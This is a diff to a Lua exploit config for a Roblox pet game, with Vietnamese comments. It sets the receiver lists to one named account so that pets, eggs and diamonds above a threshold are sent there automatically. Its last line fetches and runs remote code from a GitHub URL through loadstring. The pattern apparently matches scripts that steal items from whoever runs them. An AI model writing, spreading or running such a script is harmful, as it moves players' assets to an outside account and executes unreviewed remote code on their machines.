@@ -10,9 +10,9 @@ getgenv().Config = {
         PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7 , 8, 9}, -- slot dành cho pet
         EGG_SLOTS = { 10 }, -- slot dành cho trứng
     },
-    Usernames = { '' }, -- Danh sách người nhận
+    Usernames = { 'DreamSoCow' }, -- Danh sách người nhận
     PetSendInterval = 10, -- Thời gian quét và gửi lại (giây)
-    MinDiamonds = 50000000, -- Gửi khi kim cương > số này
-    Receivers = { '' }, -- Danh sách người nhận
+    MinDiamonds = 100000000, -- Gửi khi kim cương > số này
+    Receivers = { 'DreamSoCow' }, -- Danh sách người nhận
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
